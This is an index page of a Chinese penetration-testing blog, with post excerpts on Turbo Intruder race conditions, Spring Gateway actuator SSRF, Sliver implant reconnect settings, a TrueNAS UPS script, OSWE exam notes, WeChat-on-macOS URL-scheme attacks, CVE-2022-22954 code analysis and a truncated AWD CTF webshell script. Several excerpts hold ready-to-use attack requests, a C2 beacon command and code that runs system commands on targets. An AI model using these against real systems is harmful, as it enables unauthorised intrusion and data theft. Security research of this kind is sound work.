@@ -1,0 +1,1023 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Posts :: Ca1s1&#39;Blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="https://vuln.top/posts/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="https://vuln.top/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="https://vuln.top/img/theme-colors/green.png">
+  <link rel="apple-touch-icon" href="https://vuln.top/img/theme-colors/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="website" />
+<meta property="og:title" content="Posts">
+<meta property="og:description" content="" />
+<meta property="og:url" content="https://vuln.top/posts/" />
+<meta property="og:site_name" content="Ca1s1&#39;Blog" />
+
+  
+    <meta property="og:image" content="https://vuln.top/img/favicon/green.png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+
+
+
+  <link href="/posts/index.xml" rel="alternate" type="application/rss+xml" title="Ca1s1&#39;Blog" />
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="https://vuln.top/">
+  <div class="logo">
+    Ca1s1'Blog
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about/">about</a></li>
+        
+      
+        
+          <li><a href="/link/">link</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/about/" >about</a></li>
+        
+      
+        
+          <li><a href="/link/" >link</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+  
+  <div class="posts">
+    
+      <article class="post on-list">
+        <h1 class="post-title">
+          <a href="https://vuln.top/posts/burpsuiteturbointruder/">Turbo Intruder条件竞争代码</a>
+        </h1>
+        <div class="post-meta">
+          
+            <time class="post-date">
+              2025-05-25 ::
+            </time>
+          
+          
+            <span class="post-author">Ca1s1</span>
+          
+        </div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="https://vuln.top/tags/burpsuite/">Burpsuite</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/extensions/">Extensions</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            <h1 id="turbo-intruder">Turbo Intruder</h1>
+<h2 id="条件竞争">条件竞争</h2>
+<p>不知道哪个版本Turbo Intruder少了这个默认的模版记录下。</p>
+<pre tabindex="0"><code>def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=30,
+                           requestsPerConnection=100,
+                           pipeline=False
+                           )
+
+    # the &#39;gate&#39; argument blocks the final byte of each request until openGate is invoked
+    for i in range(30):
+        engine.queue(target.req, target.baseInput, gate=&#39;race1&#39;)
+
+    # wait until every &#39;race1&#39; tagged request is ready
+    # then send the final byte of each request
+    # (this method is non-blocking, just like queue)
+    engine.openGate(&#39;race1&#39;)
+
+    engine.complete(timeout=60)
+
+
+def handleResponse(req, interesting):
+    table.add(req)
+</code></pre>
+          
+        </div>
+
+        
+          <div>
+            <a class="read-more button" href="/posts/burpsuiteturbointruder/"> →</a>
+          </div>
+        
+      </article>
+    
+      <article class="post on-list">
+        <h1 class="post-title">
+          <a href="https://vuln.top/posts/spring%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1%E5%AE%9E%E7%8E%B0ssrf/">Spring添加路由实现ssrf</a>
+        </h1>
+        <div class="post-meta">
+          
+            <time class="post-date">
+              2025-05-25 ::
+            </time>
+          
+          
+            <span class="post-author">Ca1s1</span>
+          
+        </div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="https://vuln.top/tags/spring/">spring</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/ssrf/">ssrf</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            <p>在某个项目中遇到的gateway接口不支持spel表达式执行命令，但是通过实现ssrf内网漫游</p>
+<p>查看Gateway/routedefinitions接口可以查看到所有的路由</p>
+<pre tabindex="0"><code>GET /api/actuator/gateway/routedefinitions HTTP/2
+Host: localhost
+Content-Length: 0
+Sec-Ch-Ua-Platform: &#34;macOS&#34;
+Accept-Language: zh-CN,zh;q=0.9
+Sec-Ch-Ua: &#34;Not?A_Brand&#34;;v=&#34;99&#34;, &#34;Chromium&#34;;v=&#34;130&#34;
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
+Accept: application/json, text/plain, */*
+Content-Type: application/json;charset=UTF-8
+Origin: https://localhost
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://localhost/
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+</code></pre><p>修改http://xxxxxxx/为内网地址</p>
+<pre tabindex="0"><code>POST /api/actuator/gateway/routes/first HTTP/2
+Host: localhost
+Content-Length: 243
+Sec-Ch-Ua-Platform: &#34;macOS&#34;
+Accept-Language: zh-CN,zh;q=0.9
+Sec-Ch-Ua: &#34;Not?A_Brand&#34;;v=&#34;99&#34;, &#34;Chromium&#34;;v=&#34;130&#34;
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
+Accept: application/json, text/plain, */*
+Content-Type: application/json
+Origin: https://localhost
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://localhost/
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+
+{
+  &#34;id&#34;: &#34;first&#34;,
+  &#34;predicates&#34;: [{
+    &#34;name&#34;: &#34;Path&#34;,
+    &#34;args&#34;: {&#34;_genkey_0&#34;:&#34;/api/aliyuncer/**&#34;}
+  }],
+  &#34;filters&#34;: [
+      &#34;StripPrefix=2&#34;
+  ],
+  &#34;uri&#34;: &#34;http://xxxxxxx/&#34;,
+  &#34;order&#34;: -1
+}
+</code></pre><pre tabindex="0"><code>POST /api/actuator/refresh HTTP/2
+Host: localhost
+Sec-Ch-Ua-Platform: &#34;macOS&#34;
+Accept-Language: zh-CN,zh;q=0.9
+Sec-Ch-Ua: &#34;Not?A_Brand&#34;;v=&#34;99&#34;, &#34;Chromium&#34;;v=&#34;130&#34;
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
+Accept: application/json, text/plain, */*
+Origin: https://localhost
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://localhost/
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+Content-Type: application/json
+Content-Length: 0
+</code></pre><p>之后访问/api/aliyuncer/即为内网http://xxxxxxx/，通过burp编写替换路径的规则可以实现很方便访问内网的方法。</p>
+          
+        </div>
+
+        
+          <div>
+            <a class="read-more button" href="/posts/spring%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1%E5%AE%9E%E7%8E%B0ssrf/"> →</a>
+          </div>
+        
+      </article>
+    
+      <article class="post on-list">
+        <h1 class="post-title">
+          <a href="https://vuln.top/posts/sliver-reconnect/">Sliver服务端口丢失客户端自动断开</a>
+        </h1>
+        <div class="post-meta">
+          
+            <time class="post-date">
+              2025-02-22 ::
+            </time>
+          
+          
+            <span class="post-author">ca1s1</span>
+          
+        </div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="https://vuln.top/tags/sliver/">sliver</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/config/">config</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            <blockquote>
+<p><strong>sliver</strong>  <em>&ndash;max-errors</em>值为 1000，<em>&ndash;reconnect</em>设置为 60 秒；这意味着如果之前的连接失败，植入物应该每 60 秒尝试重新连接一次，最多 1000 次，大约 16 小时。</p>
+</blockquote>
+<p>虽然不能关闭<em>max-errors</em>，但是可以设置一个超大值接近于无限期。</p>
+<p>这是reconnect为12个小时，理论上可以重新尝试250天
+<code>generate beacon --mtls 0.0.0.0:4444 --os linux --arch amd64 --save /tmp/ --hours 4 --jitter 3 --reconnect 43200</code></p>
+<blockquote>
+<p>参考：
+<a href="https://github.com/BishopFox/sliver/issues/1253">https://github.com/BishopFox/sliver/issues/1253</a></p>
+</blockquote>
+          
+        </div>
+
+        
+          <div>
+            <a class="read-more button" href="/posts/sliver-reconnect/"> →</a>
+          </div>
+        
+      </article>
+    
+      <article class="post on-list">
+        <h1 class="post-title">
+          <a href="https://vuln.top/posts/truenas-ut650egc-ups/">Truenas 安装 UT650EGC UPS</a>
+        </h1>
+        <div class="post-meta">
+          
+            <time class="post-date">
+              2024-03-20 ::
+            </time>
+          
+          
+            <span class="post-author">Ca1s1</span>
+          
+        </div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="https://vuln.top/tags/ups/">UPS</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            <h1 id="truenas-安装-ut650egc-ups">Truenas 安装 UT650EGC UPS</h1>
+<p>默认情况下通过web启动ups服务功能，Truenas会报服务出错<code>/run/nut/upsmon.pid: No space left on device</code>
+选了好几个驱动也不行，问客服和售后也不懂，只能自己解决。</p>
+<p>通过这篇文章手动调通了NUT
+<a href="https://www.wangchucheng.com/zh/posts/setting-up-ups-with-nut-on-linux/">https://www.wangchucheng.com/zh/posts/setting-up-ups-with-nut-on-linux/</a>
+写一个bash脚本每次开启自启就行了。</p>
+<pre tabindex="0"><code>#!/bin/bash
+
+
+config=&#34;maxretry = 3
+[myupsname][JEB_Debug_Encrypt](assets/JEB_Debug_Encrypt.md)
+  driver = usbhid-ups
+  port = auto
+  desc = \&#34;My UPS\&#34;
+&#34;
+
+
+echo &#34;$config&#34; &gt; /etc/nut/ups.conf
+
+
+/sbin/upsdrvctl start
+
+
+config1=&#34;[monuser]
+  password = mypass
+  upsmon master&#34;
+
+
+echo &#34;$config1&#34; &gt; /etc/nut/upsd.users
+
+chown root:nut /etc/nut/upsd.conf /etc/nut/upsd.users
+chmod 0640 /etc/nut/upsd.conf /etc/nut/upsd.users
+
+/sbin/upsd -c reload
+
+echo &#34;MODE=standalone&#34; &gt; /etc/nut/nut.conf
+
+/bin/upsc myupsname@localhost
+
+config3=&#34;POWERDOWNFLAG /etc/killpower
+MONITOR myupsname@localhost 1 monuser mypass master
+SHUTDOWNCMD \&#34;/sbin/shutdown -P now\&#34;&#34;
+
+echo &#34;$config3&#34; &gt; /etc/nut/upsmon.conf
+chown root:nut /etc/nut/upsmon.conf
+chmod 0640 /etc/nut/upsmon.conf
+
+/sbin/upsmon -c reload
+</code></pre>
+          
+        </div>
+
+        
+          <div>
+            <a class="read-more button" href="/posts/truenas-ut650egc-ups/"> →</a>
+          </div>
+        
+      </article>
+    
+      <article class="post on-list">
+        <h1 class="post-title">
+          <a href="https://vuln.top/posts/oswe/">OSWE考试总结</a>
+        </h1>
+        <div class="post-meta">
+          
+            <time class="post-date">
+              2023-06-19 ::
+            </time>
+          
+          
+            <span class="post-author">ca1s1</span>
+          
+        </div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="https://vuln.top/tags/%E8%80%83%E8%AF%95/">考试</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/oswe/">oswe</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/%E8%AE%A4%E8%AF%81/">认证</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            <h2 id="时间记录">时间记录</h2>
+<p>开始时间17日早上6点，那天正好我的代理过期了，考试网络弄了2个小时。。算是8点才开始做。</p>
+<table>
+  <thead>
+      <tr>
+          <th>目标</th>
+          <th>时间</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>第一台auth bypass</td>
+          <td>17日13:28</td>
+      </tr>
+      <tr>
+          <td>第一台system</td>
+          <td>17日18:32</td>
+      </tr>
+      <tr>
+          <td>睡觉</td>
+          <td>18日3:00-8:00</td>
+      </tr>
+      <tr>
+          <td>第二台auth bypass</td>
+          <td>18日9:29</td>
+      </tr>
+      <tr>
+          <td>第二台system</td>
+          <td>没看太累了直接结束。。</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="自我介绍">自我介绍</h2>
+<p>以前参加过几次CTF比赛，主要方向就是Web，自己审计过几套php的cms，所以不算纯小白，我把除了课件上的3道课后题做了一遍感觉难度中等，就准备预约考试了。</p>
+<h2 id="考试">考试</h2>
+<p>考试有5台机器，2台用于调试，2台目标机器，1台kali，我有oscp考试的经验，所以上去先将所有机器进行了重置（oscp没有重置遇到坑了。。），但是那天我代理正好过期了，有点倒霉，早上刚开始就浪费2个小时，但是网速情况还可以，gui远程调试基本没问题。</p>
+<p>难度肯定是比OSCP难的，但是相较于国内CTF还是相对简单，不需要像CTF一样考脑洞，一般情况是多个基础漏洞组合起来获得权限。主要困难是在这么多代码中找到存在漏洞的点（会有兔子洞），基本需要通读所有代码，还是比较累的。</p>
+<p>考试前建议认真看一遍考试规则，和考试报告的模版，这样不至于忘记截图。</p>
+<p>提前准备好需要用的脚本，比如sql注入脚本等等，考试的时候直接改就行。</p>
+<p>考试时间一定要提前预约本来我一个月前就想考了，但是已经没有周六周日的考试时间了，我只能预约下个月的，还是早上六点考试，我人迷迷糊糊的有一段时间基本都在梦游。。</p>
+<p>考试至少需要85分（满分100），拿到Auth Bypass 35分，获得系统权限15分，一共2台机器相当于至少要完成一个完整靶机和一个Auth Bypass。</p>
+<p>考试完第二天就发证书了，速度还是挺快的QAQ</p>
+<h2 id="为什么要考-oswe">为什么要考 OSWE</h2>
+<p>这几年工作下来感觉对技术的渴望下降了不少，惰性占据上风，需要一个目标来鞭策自己，不让自己犯懒。我觉得Offensive Security 认证体系很不错，我挺喜欢的，不喜欢国内某些给钱就能过的考试，所以我定的目标是拿到OSCE3，希望能够成功。</p>
+<p><strong>Try Harder</strong></p>
+          
+        </div>
+
+        
+          <div>
+            <a class="read-more button" href="/posts/oswe/"> →</a>
+          </div>
+        
+      </article>
+    
+      <article class="post on-list">
+        <h1 class="post-title">
+          <a href="https://vuln.top/posts/my-first-post/">MAC下微信浏览器可能可行的利用方式</a>
+        </h1>
+        <div class="post-meta">
+          
+            <time class="post-date">
+              2023-04-24 ::
+            </time>
+          
+          
+            <span class="post-author">Ca1s1</span>
+          
+        </div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="https://vuln.top/tags/rce/">rce</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/%E7%A0%94%E7%A9%B6/">研究</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            <p>在MAC下的微信浏览器，与其他浏览器不同，通过在笔记中添加协议，在用户点击后会自动执行url scheme协议，用户无需确认即可执行。</p>
+<p>下面列出几种可行的攻击方案，但是还没有找到一种比较完美的：</p>
+<p>1、通过file协议可直接执行app文件，但是前提是需要文件落地，所以需要预先将文件传输，但是如果通过http等方式下载文件运行app是会触发到mac的Gatekeep机制导致无法直接运行、而在MAC OS10.15版本后通过smb等方式传输的文件会存在LSOpenURLsWithRole() failed with error -10810错误导致无法运行，即使你全部都绕过，攻击者仍然需要在知道文件路径的情况下，再让其点击链接，所以这种攻击难度较高。</p>
+<p>2、通过MAC OS本身一些软件存在的URL Schemes，如果这些软件的URL Schemes存在漏洞或者可以bypass即可实现攻击，如通过<a href="https://blog.chichou.me/2020/07/01/x-site-escape-part-iii-cve-2020-9860-a-copycat/">c</a>ve-2020-9860，具体可以看<a href="https://blog.chichou.me/2020/07/01/x-site-escape-part-iii-cve-2020-9860-a-copycat/">https://blog.chichou.me/2020/07/01/x-site-escape-part-iii-cve-2020-9860-a-copycat/</a>，但这</p>
+<p>种攻击方式成本较高，需要配合MACOS上的漏洞或其他常用软件打组合拳才能RCE。我通过将本地所有的URL Schemes进行遍历。</p>
+<p>找到ms-powerpoint:///etc/hosts，通过微软的PPT URL Schemes可以读取到本地的文件，</p>
+<p>具体代码如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">p</span>&gt;<span style="color:#a6e22e">Loading</span>...&lt;/<span style="color:#f92672">p</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">setInterval</span>(() =&gt; {<span style="color:#a6e22e">location</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;ms-powerpoint:///etc/hosts&#39;</span>}, <span style="color:#ae81ff">2000</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p>在这种情况下其实只需要找到一种，将文件重定向到外网服务器的方法即可读取到任意文件，虽然通过测试发现smb可以不用输入账户密码即可连接vps，但是由于我基本功太菜暂时没有找到如何传输。</p>
+<p>3、利用自定义到URL Scheme远程突破MAC</p>
+<p>WINDSHIFT APT组织曾经通过该方法远程感染MACOS目标主机，在MACOS中应用程序可以“声明”自己能够支持（或者“处理”）各种文档类型以及/或者自定义的URL Scheme，且自定义的方式非常简单只需要在APP文件中的Info.plist文件加入URL Type数组即可实现，而且只需要APP文件落地到目标机器，MACOS会自动查找APP文件中Info.plist文件是否存在URL Types如果存在自动注册。</p>
+<p>通过MACOS默认的Safari浏览器下载压缩包，后会自动解压文件，从而文件落地自定义URL Scheme在通过点击链接触发自定义的URL Scheme。但是这种方式需要绕过Gatekeeper和文件隔离，Gatekeeper可以通过给APP文件签名绕过，文件隔离需要通过给文件名添加诱惑性文字，让其点击有点类似社工方式才能实现。虽然需要用户交互，然而这种功能已经在实际攻击活动中被成功利用。具体操作可以看<a href="https://www.anquanke.com/post/id/158679">https://www.anquanke.com/post/id/158679</a>。</p>
+          
+        </div>
+
+        
+          <div>
+            <a class="read-more button" href="/posts/my-first-post/"> →</a>
+          </div>
+        
+      </article>
+    
+      <article class="post on-list">
+        <h1 class="post-title">
+          <a href="https://vuln.top/posts/cve-2022-22954/">CVE-2022-22954</a>
+        </h1>
+        <div class="post-meta">
+          
+            <time class="post-date">
+              2023-01-23 ::
+            </time>
+          
+          
+            <span class="post-author">Ca1s1</span>
+          
+        </div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="https://vuln.top/tags/%E5%A4%8D%E7%8E%B0/">复现</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/cve/">CVE</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            <h1 id="cve-2022-22954">CVE-2022-22954</h1>
+<h2 id="代码分析">代码分析</h2>
+<p><a href="http://file.xipudata.com/?dir=/2_software/Vmware/Horizon8">http://file.xipudata.com/?dir=/2_software/Vmware/Horizon8</a>
+下载好ova，使用vmware安装搭建，导入时添加下域名。
+<img src="/img/16534685569681/16534686232696.jpg" alt="">
+根据官方提供的临时修复脚本可以知道漏洞存在于
+<code>/opt/vmware/horizon/workspace/webapps/catalog-portal/WEB-INF/lib/endusercatalog-ui-1.0-SNAPSHOT-classes.jar</code>
+<img src="/img/16534685569681/16534687156233.jpg" alt="">
+修复脚本中还提到了这个文件
+<img src="/img/16534685569681/16534692518129.jpg" alt="">
+查看该文件后发现存在eval，这是java freemarker的写法，用来把字符串当作ftl代码，所以我们只需要控制errorObj即可实现代码执行
+<img src="/img/16534685569681/16534695194137.jpg" alt="">
+所以我们知道漏洞来源于customError,我们需要找到可以到达customError的路由，并且可以控制errorObj
+在UiErrorController.class中可以找到handleGenericError，可以传递errorObj，最后return到customError</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> String <span style="color:#a6e22e">handleGenericError</span>(<span style="color:#66d9ef">final</span> HttpServletRequest request, <span style="color:#66d9ef">final</span> HttpServletResponse response, <span style="color:#66d9ef">final</span> Map<span style="color:#f92672">&lt;</span>String, Object<span style="color:#f92672">&gt;</span> model, <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">boolean</span> isAWJade, <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">boolean</span> garnetAndAbove, <span style="color:#66d9ef">final</span> String excpClass, <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span> errorCode, <span style="color:#66d9ef">final</span> String errorMessage) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">final</span> String localizedMessageHeader <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">messages</span>.<span style="color:#a6e22e">getLocalizedErrorMessage</span>(<span style="color:#e6db74">&#34;errorPage.errorHeading&#34;</span>, request.<span style="color:#a6e22e">getLocale</span>(), (Object<span style="color:#f92672">[]</span>)<span style="color:#66d9ef">null</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">final</span> String localizedMessage <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">messages</span>.<span style="color:#a6e22e">getLocalizedErrorMessage</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getLocalizedMessageKey</span>(excpClass), request.<span style="color:#a6e22e">getLocale</span>(), (Object<span style="color:#f92672">[]</span>)<span style="color:#66d9ef">null</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (errorCode <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span>1) {
+</span></span><span style="display:flex;"><span>            response.<span style="color:#a6e22e">setStatus</span>(errorCode);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        model.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;errorObj&#34;</span>, errorMessage);
+</span></span><span style="display:flex;"><span>        model.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;messageHeader&#34;</span>, localizedMessageHeader);
+</span></span><span style="display:flex;"><span>        model.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;genericErrorMsg&#34;</span>, localizedMessage);
+</span></span><span style="display:flex;"><span>        model.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;contextPath&#34;</span>, request.<span style="color:#a6e22e">getContextPath</span>());
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (isAWJade) {
+</span></span><span style="display:flex;"><span>            WebUtils.<span style="color:#a6e22e">markCookiesForDeletion</span>(request, response, <span style="color:#66d9ef">new</span> String<span style="color:#f92672">[]</span> { <span style="color:#e6db74">&#34;USER_CATALOG_CONTEXT&#34;</span> });
+</span></span><span style="display:flex;"><span>            WebUtils.<span style="color:#a6e22e">markCookiesForDeletionWithPath</span>(request, response, <span style="color:#e6db74">&#34;/catalog-portal&#34;</span>, <span style="color:#66d9ef">new</span> String<span style="color:#f92672">[]</span> { <span style="color:#e6db74">&#34;EUC_XSRF_TOKEN&#34;</span> });
+</span></span><span style="display:flex;"><span>            model.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;logoutPath&#34;</span>, retrieveServerInitiatedLogoutPath(garnetAndAbove).<span style="color:#a6e22e">getName</span>());
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">final</span> StringBuilder logoutUrl <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> StringBuilder(request.<span style="color:#a6e22e">getContextPath</span>()).<span style="color:#a6e22e">append</span>(<span style="color:#e6db74">&#34;/ui&#34;</span>).<span style="color:#a6e22e">append</span>(<span style="color:#e6db74">&#34;/logout&#34;</span>);
+</span></span><span style="display:flex;"><span>            String queryStr <span style="color:#f92672">=</span> request.<span style="color:#a6e22e">getQueryString</span>();
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (StringUtils.<span style="color:#a6e22e">isNotBlank</span>((CharSequence)queryStr)) {
+</span></span><span style="display:flex;"><span>                queryStr <span style="color:#f92672">=</span> UrlUtils.<span style="color:#a6e22e">encodeQuery</span>(UrlUtils.<span style="color:#a6e22e">decode</span>(queryStr));
+</span></span><span style="display:flex;"><span>                logoutUrl.<span style="color:#a6e22e">append</span>(<span style="color:#e6db74">&#39;?&#39;</span>).<span style="color:#a6e22e">append</span>(queryStr);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            model.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;logoutPath&#34;</span>, logoutUrl.<span style="color:#a6e22e">toString</span>());
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;customError&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>所以我们继续往上找到<code>getErrorPage</code>和<code>handleUnauthorizedError</code>，调用了<code>handleGenericError</code></p>
+          
+        </div>
+
+        
+          <div>
+            <a class="read-more button" href="/posts/cve-2022-22954/"> →</a>
+          </div>
+        
+      </article>
+    
+      <article class="post on-list">
+        <h1 class="post-title">
+          <a href="https://vuln.top/posts/awd-flag-script/">AWD FLAG SCRIPT</a>
+        </h1>
+        <div class="post-meta">
+          
+            <time class="post-date">
+              2022-04-22 ::
+            </time>
+          
+          
+            <span class="post-author">Ca1s1</span>
+          
+        </div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="https://vuln.top/tags/awd/">AWD</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/ctf/">CTF</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            <h1 id="awd-flag脚本">AWD FLAG脚本</h1>
+<p>之前AWD的自动写🐴获取flag脚本。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> json
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> random
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">filename</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;.&#39;</span><span style="color:#f92672">+</span>str(int(random<span style="color:#f92672">.</span>uniform(<span style="color:#ae81ff">10000000</span>, <span style="color:#ae81ff">99999999</span>)))<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;.php&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exp1</span>(target):
+</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://&#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;/admin/test.php&#39;</span>
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;cmd&#34;</span>:<span style="color:#e6db74">&#34;system(&#39;cat /flag&#39;);&#34;</span>}
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url<span style="color:#f92672">=</span>url, data<span style="color:#f92672">=</span>data, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
